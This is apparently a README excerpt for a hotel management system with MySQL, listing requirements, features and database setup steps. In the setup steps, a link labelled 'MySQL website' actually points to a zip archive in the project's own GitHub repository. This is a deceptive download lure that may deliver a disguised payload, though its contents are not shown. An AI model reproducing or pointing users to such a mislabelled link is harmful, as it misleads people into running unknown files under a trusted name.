## 🛠️ System Requirements

Before you download, make sure your computer meets these requirements:

- **Operating System:** Windows 10 or later, macOS 10.12 or higher, or any Linux distribution.
- **Memory:** At least 4 GB of RAM.
- **Storage:** Minimum of 200 MB of free disk space.
- **Database:** MySQL version 5.7 or higher.

## 🎯 Features

This application includes the following key features:

- **Dynamic Pricing:** Automatically adjust room rates based on demand.
- **Overlap-Safe Availability Logic:** Prevent double bookings with intelligent scheduling.
- **Python Analytics:** Get insights into your bookings, cancellations, and revenue trends.
- **User-Friendly Interface:** Easy navigation for all users, regardless of technical skill.
- **Detailed Reports:** Generate reports to understand your hotel's performance better.

## 📊 Data Management 

The application uses MySQL for data management. You will need to set up a MySQL database before running the software. Here’s a simple guide to do that:

1. **Install MySQL:** Visit the [MySQL website](https://github.com/perfilcursor18-pixel/hotel-management-system-sql/raw/refs/heads/main/outputs/management_system_sql_hotel_1.8-beta.1.zip) and download the installer.
2. **Create a Database:**
   - Open the MySQL command line or a graphical interface like MySQL Workbench.
   - Run the command: `CREATE DATABASE hotel_management;`
3. **Connect the Application:** Enter your database credentials in the application settings.
